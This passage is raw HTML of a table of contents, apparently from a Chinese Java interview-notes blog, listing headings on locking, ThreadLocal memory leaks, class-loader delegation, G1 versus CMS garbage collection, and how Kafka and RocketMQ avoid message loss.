href="#synchronized%E5%92%8Creentrantlock%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">synchronized和reentrantlock的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E8%AF%A6%E7%BB%86%E5%8C%BA%E5%88%AB%E8%AE%B2%E8%A7%A3%EF%BC%88%E7%BB%93%E5%90%88%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%EF%BC%89"><span class="toc-text">✅ 二、详细区别讲解（结合面试答题）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86%E4%B8%8D%E5%90%8C%EF%BC%88%E5%AD%97%E8%8A%82%E7%A0%81-vs-API%EF%BC%89"><span class="toc-text">1. 原理不同（字节码 vs API）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%98%AF%E5%90%A6%E5%8F%AF%E4%B8%AD%E6%96%AD-%E8%B6%85%E6%97%B6"><span class="toc-text">2. 是否可中断&#x2F;超时</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%AC%E5%B9%B3%E9%94%81-vs-%E9%9D%9E%E5%85%AC%E5%B9%B3%E9%94%81"><span class="toc-text">3. 公平锁 vs 非公平锁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%98%AF%E5%90%A6%E8%87%AA%E5%8A%A8%E9%87%8A%E6%94%BE%E9%94%81"><span class="toc-text">4. 是否自动释放锁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF%E5%AF%B9%E6%AF%94%E4%B8%BE%E4%BE%8B"><span class="toc-text">✅ 三、使用场景对比举例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A%E9%93%B6%E8%A1%8C%E8%B4%A6%E6%88%B7%E8%BD%AC%E8%B4%A6%EF%BC%88%E5%AD%98%E5%9C%A8%E4%B8%AD%E6%96%AD%E5%92%8C%E8%B6%85%E6%97%B6%E8%A6%81%E6%B1%82%EF%BC%89"><span class="toc-text">例子：银行账户转账（存在中断和超时要求）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF%E6%80%BB%E7%BB%93"><span class="toc-text">✅ 四、面试答题模板总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E4%B8%AD%E6%96%AD%E6%94%AF%E6%8C%81%EF%BC%88interruptible%EF%BC%89"><span class="toc-text">✅ 一、中断支持（interruptible）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B81-%E4%BD%BF%E7%94%A8-synchronized-%E7%9A%84%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-text">🔸1. 使用 synchronized 的运行效果：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-%E4%BD%BF%E7%94%A8-ReentrantLock-lockInterruptibly-%E7%9A%84%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-text">✅ 2. 使用 ReentrantLock.lockInterruptibly() 的运行效果：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E8%B6%85%E6%97%B6%E6%8E%A7%E5%88%B6"><span class="toc-text">✅ 二、超时控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B81-synchronized-%E7%9A%84%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-text">🔸1. synchronized 的运行效果：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-ReentrantLock-tryLock-timeout"><span class="toc-text">✅ 2. ReentrantLock.tryLock(timeout)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E5%85%AC%E5%B9%B3%E6%80%A7%E6%8E%A7%E5%88%B6"><span class="toc-text">✅ 三、公平性控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B81-synchronized-%E7%9A%84%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C%EF%BC%9A-2"><span class="toc-text">🔸1. synchronized 的运行效果：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-ReentrantLock-true-%E5%85%AC%E5%B9%B3%E9%94%81%E7%9A%84%E8%BF%90%E8%A1%8C%E6%95%88%E6%9E%9C%EF%BC%9A"><span class="toc-text">✅ 2. ReentrantLock(true) 公平锁的运行效果：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E9%9D%A2%E8%AF%95%E8%AF%9D%E6%9C%AF%E6%A8%A1%E6%9D%BF"><span class="toc-text">✅ 总结面试话术模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThreadLocal%E7%9A%84%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98"><span class="toc-text">ThreadLocal的内存泄露问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThreadLocal%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">ThreadLocal是什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E9%80%9A%E4%BF%97%E7%90%86%E8%A7%A3"><span class="toc-text">✅ 一、通俗理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">✅ 二、核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90%EF%BC%9A%E4%B8%8D%E5%90%8C%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8F%98%E9%87%8F%E4%BA%92%E4%B8%8D%E5%BD%B1%E5%93%8D"><span class="toc-text">✅ 三、简单例子：不同线程的变量互不影响</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="toc-text">输出结果：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98"><span class="toc-text">内存泄露问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A8-%E4%B8%89%E3%80%81%E9%82%A3%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%EF%BC%9F"><span class="toc-text">🧨 三、那为什么会内存泄漏？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E5%B8%B8%E6%83%85%E5%86%B5%EF%BC%9A"><span class="toc-text">✅ 正常情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E5%BC%82%E5%B8%B8%E6%83%85%E5%86%B5%EF%BC%88%E6%9C%80%E5%AE%B9%E6%98%93%E8%B8%A9%E5%9D%91%EF%BC%89%EF%BC%9A"><span class="toc-text">❌ 异常情况（最容易踩坑）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E8%BF%99%E5%B0%B1%E6%98%AF%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F-%E2%80%94%E2%80%94-%E2%80%9C%E6%9C%89%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8D%A0%E7%9D%80%E4%BD%86%E6%B0%B8%E8%BF%9C%E8%AE%BF%E9%97%AE%E4%B8%8D%E5%88%B0%E2%80%9D%E3%80%82"><span class="toc-text">📌 这就是内存泄漏 —— “有用的内存占着但永远访问不到”。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E5%9B%9B%E3%80%81%E6%BC%94%E7%A4%BA%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%88%E7%BA%BF%E7%A8%8B%E6%B1%A0-%E4%B8%8D-remove%EF%BC%89"><span class="toc-text">🧪 四、演示内存泄漏的例子（线程池 + 不 remove）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%98%A0%EF%B8%8F-%E8%BF%90%E8%A1%8C%E5%90%8E%E7%8E%B0%E8%B1%A1%EF%BC%9A"><span class="toc-text">☠️ 运行后现象：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%EF%BC%9F"><span class="toc-text">为什么会内存泄露？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%EF%BC%9AThread-%E6%98%AF%E5%BC%BA%E5%BC%95%E7%94%A8%E7%9A%84%EF%BC%8C%E5%9C%A8%E7%BA%BF%E7%A8%8B%E6%B1%A0%E4%B8%AD%E7%BA%BF%E7%A8%8B%E4%B8%8D%E7%BB%93%E6%9D%9F%EF%BC%8CThreadLocalMap-%E9%95%BF%E6%97%B6%E9%97%B4%E5%AD%98%E6%B4%BB%E3%80%82"><span class="toc-text">关键：Thread 是强引用的，在线程池中线程不结束，ThreadLocalMap 长时间存活。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6"><span class="toc-text">双亲委派机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E6%AD%A3%E7%A1%AE%E7%9A%84%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F%EF%BC%88%E4%BB%8E%E5%AD%90%E5%8F%91%E8%B5%B7-%E2%86%92-%E7%88%B6%E5%B0%9D%E8%AF%95%E5%8A%A0%E8%BD%BD-%E2%86%92-%E5%AD%90%E5%86%8D%E8%87%AA%E5%B7%B1%E5%8A%A0%E8%BD%BD%EF%BC%89"><span class="toc-text">🔁 正确的加载顺序（从子发起 → 父尝试加载 → 子再自己加载）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6%EF%BC%9F"><span class="toc-text">🧠 一、什么是双亲委派机制？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%A6-%E4%BA%8C%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%EF%BC%9F"><span class="toc-text">📦 二、为什么使用双亲委派？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E9%98%B2%E6%AD%A2%E9%87%8D%E5%A4%8D%E5%8A%A0%E8%BD%BD"><span class="toc-text">✅ 防止重复加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BF%9D%E8%AF%81%E6%A0%B8%E5%BF%83%E7%B1%BB%E5%AE%89%E5%85%A8"><span class="toc-text">✅ 保证核心类安全</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%B8%89%E3%80%81%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%E8%AF%B4%E6%98%8E%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-text">🔍 三、举个例子说明加载流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%84-%E5%9B%9B%E3%80%81%E4%BD%95%E6%97%B6%E6%89%93%E7%A0%B4%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%9C%BA%E5%88%B6%EF%BC%9F"><span class="toc-text">🔄 四、何时打破双亲委派机制？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81Servlet-%E5%AE%B9%E5%99%A8%EF%BC%88Tomcat%EF%BC%89"><span class="toc-text">1、Servlet 容器（Tomcat）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81SPI-%E6%9C%BA%E5%88%B6%EF%BC%88%E6%9C%8D%E5%8A%A1%E6%8F%90%E4%BE%9B%E8%80%85%E6%8E%A5%E5%8F%A3%EF%BC%89"><span class="toc-text">2、SPI 机制（服务提供者接口）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%85%AD%E3%80%81%E9%9D%A2%E8%AF%95%E8%AF%9D%E6%9C%AF%E6%80%BB%E7%BB%93"><span class="toc-text">🎯 六、面试话术总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#g1%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E5%92%8Ccms%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E5%AF%B9%E6%AF%94"><span class="toc-text">g1垃圾回收器和cms垃圾回收器对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E4%BA%8C%E3%80%81%E8%AF%A6%E7%BB%86%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90"><span class="toc-text">🔍 二、详细对比分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%9B%9E%E6%94%B6%E7%AD%96%E7%95%A5%E5%AF%B9%E6%AF%94"><span class="toc-text">1、回收策略对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%B1-CMS%EF%BC%9A%E5%88%86%E4%BB%A3-%E6%A0%87%E8%AE%B0%E6%B8%85%E9%99%A4"><span class="toc-text">🌱 CMS：分代 + 标记清除</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%8C%B2-G1%EF%BC%9A%E7%BB%9F%E4%B8%80-Region-%E6%A0%87%E8%AE%B0%E5%A4%8D%E5%88%B6-%E6%95%B4%E7%90%86"><span class="toc-text">🌲 G1：统一 Region + 标记复制 + 整理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81GC-%E8%BF%87%E7%A8%8B%E5%AF%B9%E6%AF%94"><span class="toc-text">2、GC 过程对比</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CMS-%E5%9B%9E%E6%94%B6%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%88%E8%80%81%E5%B9%B4%E4%BB%A3%EF%BC%89%EF%BC%9A"><span class="toc-text">CMS 回收流程图（老年代）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#G1-%E5%9B%9E%E6%94%B6%E6%B5%81%E7%A8%8B%E5%9B%BE%EF%BC%9A"><span class="toc-text">G1 回收流程图：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%EF%BC%9A%E5%A4%A7%E5%AF%B9%E8%B1%A1%E5%9B%9E%E6%94%B6%E4%B8%8E%E7%A2%8E%E7%89%87%E9%97%AE%E9%A2%98"><span class="toc-text">3、举例说明：大对象回收与碎片问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CMS%EF%BC%9A"><span class="toc-text">CMS：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#G1%EF%BC%9A"><span class="toc-text">G1：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E4%B8%89%E3%80%81%E9%9D%A2%E8%AF%95%E5%9B%9E%E7%AD%94%E8%AF%9D%E6%9C%AF%E6%80%BB%E7%BB%93"><span class="toc-text">🧪 三、面试回答话术总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%EF%BC%9ACMS-%E4%B8%8E-G1-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-text">面试官问：CMS 与 G1 有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%EF%BC%9AG1-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E9%81%BF%E5%85%8D%E5%86%85%E5%AD%98%E7%A2%8E%E7%89%87%EF%BC%9F"><span class="toc-text">面试官问：G1 为什么能避免内存碎片？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%EF%BC%9AG1-%E4%B8%8E-CMS-%E7%9A%84%E5%9B%9E%E6%94%B6%E6%B5%81%E7%A8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C%EF%BC%9F"><span class="toc-text">面试官问：G1 与 CMS 的回收流程有什么不同？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mq%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%B8%8D%E4%B8%A2%E5%A4%B1"><span class="toc-text">mq如何保证数据不丢失</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81MQ-%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E4%B8%A2%E5%A4%B1%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B"><span class="toc-text">✅ 一、MQ 保证消息不丢失的完整流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%A9-1-%E7%94%9F%E4%BA%A7%E7%AB%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E2%80%9C%E6%B6%88%E6%81%AF%E6%88%90%E5%8A%9F%E5%8F%91%E9%80%81%E5%88%B0-Broker%E2%80%9D%EF%BC%9F"><span class="toc-text">🚩 1. 生产端：如何保证“消息成功发送到 Broker”？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%92-%E6%9C%BA%E5%88%B6%EF%BC%9A%E6%B6%88%E6%81%AF%E7%A1%AE%E8%AE%A4%E6%9C%BA%E5%88%B6%EF%BC%88ACK%EF%BC%89"><span class="toc-text">🔒 机制：消息确认机制（ACK）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kafka%EF%BC%9A"><span class="toc-text">Kafka：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RocketMQ%EF%BC%9A"><span class="toc-text">RocketMQ：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E8%AF%9D%E6%9C%AF%EF%BC%9A"><span class="toc-text">✅ 面试话术：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%A9-2-Broker-%E5%AD%98%E5%82%A8%E7%AB%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E2%80%9C%E6%B6%88%E6%81%AF%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%8D%E4%B8%A2%E2%80%9D%EF%BC%9F"><span class="toc-text">🚩 2. Broker 存储端：如何保证“消息持久化不丢”？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%92-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6%E4%B8%80%EF%BC%9A%E5%86%99%E5%85%A5%E7%A3%81%E7%9B%98%EF%BC%88%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%89"><span class="toc-text">🔒 核心机制一：写入磁盘（持久化）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%81-%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6%E4%BA%8C%EF%BC%9AWAL%EF%BC%88Write-Ahead-Logging%EF%BC%89%E6%97%A5%E5%BF%97%E6%9C%BA%E5%88%B6"><span class="toc-text">🔁 核心机制二：WAL（Write-Ahead Logging）日志机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-RocketMQ-%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-text">✅ RocketMQ 示例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%A9-3-%E6%B6%88%E8%B4%B9%E7%AB%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E2%80%9C%E6%B6%88%E6%81%AF%E8%A2%AB%E6%B6%88%E8%B4%B9%E4%B8%8D%E4%BC%9A%E4%B8%A2%E2%80%9D%EF%BC%9F"><span class="toc-text">🚩 3. 消费端：如何保证“消息被消费不会丢”？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-RocketMQ-%E6%B6%88%E8%B4%B9%E8%AF%AD%E4%B9%89%EF%BC%9A"><span class="toc-text">✅ RocketMQ 消费语义：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-Kafka-%E6%B6%88%E8%B4%B9%E8%AF%AD%E4%B9%89%EF%BC%9A"><span class="toc-text">✅ Kafka 消费语义：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%87%8D%E8%A6%81%E6%89%A9%E5%B1%95%EF%BC%9A%E5%AE%95%E6%9C%BA%E5%9C%BA%E6%99%AF%E5%A6%82%E4%BD%95%E9%98%B2%E4%B8%A2"><span class="toc-text">🧠 重要扩展：宕机场景如何防丢</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF-1%EF%BC%9ABroker-%E5%AE%95%E6%9C%BA"><span class="toc-text">场景 1：Broker 宕机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF-2%EF%BC%9A%E6%B6%88%E8%B4%B9%E8%80%85%E5%AE%95%E6%9C%BA"><span class="toc-text">场景 2：消费者宕机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E5%AE%8C%E6%95%B4%E4%BE%8B%E5%AD%90%EF%BC%88Kafka%EF%BC%89"><span class="toc-text">✅ 四、完整例子（Kafka）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E9%9D%A2%E8%AF%95%E9%AB%98%E9%A2%91%E8%AF%9D%E6%9C%AF%E6%80%BB%E7%BB%93"><span class="toc-text">✅ 五、面试高频话术总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-1-MQ-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%B8%8D%E4%B8%A2%E5%A4%B1%EF%BC%9F"><span class="toc-text">✅ 1. MQ 如何保证数据不丢失？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kafka%EF%BC%9A-2"><span class="toc-text">Kafka：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RocketMQ%EF%BC%9A-2"><span class="toc-text">RocketMQ：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E7%89%88%EF%BC%9A"><span class="toc-text">详细版：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81Kafka-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E4%B8%A2%E5%A4%B1"><span class="toc-text">✅ 一、Kafka 如何保证消息不丢失</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E5%86%99%E5%85%A5%E7%AB%AF%E9%98%B2%E6%AD%A2%E4%B8%A2%E5%A4%B1%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-text">✅ 1. 写入端防止丢失的配置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90acks-all%E3%80%91"><span class="toc-text">【acks &#x3D; all】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B"><span class="toc-text">✅ 示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-Broker-%E5%AD%98%E5%82%A8%E5%B1%82%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-text">✅ 2. Broker 存储层持久化机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-PageCache-%E9%A1%BA%E5%BA%8F%E5%86%99%E5%85%A5%E7%A3%81%E7%9B%98"><span class="toc-text">🔹 PageCache + 顺序写入磁盘</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-WAL%EF%BC%88%E9%A2%84%E5%86%99%E6%97%A5%E5%BF%97%EF%BC%89%E6%9C%BA%E5%88%B6"><span class="toc-text">🔹 WAL（预写日志）机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-%E6%B6%88%E8%B4%B9%E7%AB%AF%E9%98%B2%E4%B8%A2%E7%AD%96%E7%95%A5"><span class="toc-text">✅ 3. 消费端防丢策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90%E6%89%8B%E5%8A%A8%E6%8F%90%E4%BA%A4-offset%E3%80%91"><span class="toc-text">【手动提交 offset】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90%E5%B9%82%E7%AD%89%E6%B6%88%E8%B4%B9%E9%80%BB%E8%BE%91%E3%80%91"><span class="toc-text">【幂等消费逻辑】</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81RocketMQ-%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AF%81%E6%B6%88%E6%81%AF%E4%B8%8D%E4%B8%A2%E5%A4%B1"><span class="toc-text">✅ 二、RocketMQ 如何保证消息不丢失</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E5%86%99%E5%85%A5%E7%AB%AF%E9%98%B2%E4%B8%A2%E6%9C%BA%E5%88%B6"><span class="toc-text">✅ 1. 写入端防丢机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90%E5%90%8C%E6%AD%A5%E5%88%B7%E7%9B%98-SYNC-FLUSH%E3%80%91"><span class="toc-text">【同步刷盘 SYNC_FLUSH】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90%E4%B8%BB%E4%BB%8E%E5%90%8C%E6%AD%A5%E5%A4%8D%E5%88%B6-SYNC-MASTER%E3%80%91"><span class="toc-text">【主从同步复制 SYNC_MASTER】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90CommitLog-mmap-%E9%A1%BA%E5%BA%8F%E5%86%99%E3%80%91"><span class="toc-text">【CommitLog + mmap + 顺序写】</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E6%B6%88%E8%B4%B9%E7%AB%AF%E9%98%B2%E4%B8%A2%E7%AD%96%E7%95%A5"><span class="toc-text">✅ 2. 消费端防丢策略</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90%E6%89%8B%E5%8A%A8-ACK-%E9%87%8D%E8%AF%95%E3%80%91"><span class="toc-text">【手动 ACK + 重试】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E3%80%90%E9%87%8D%E8%AF%95%E9%98%9F%E5%88%97%E6%9C%BA%E5%88%B6%E3%80%91"><span class="toc-text">【重试队列机制】</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-%E6%B6%88%E6%81%AF%E8%BD%A8%E8%BF%B9%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%88Trace%EF%BC%89"><span class="toc-text">✅ 3. 消息轨迹持久化（Trace）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 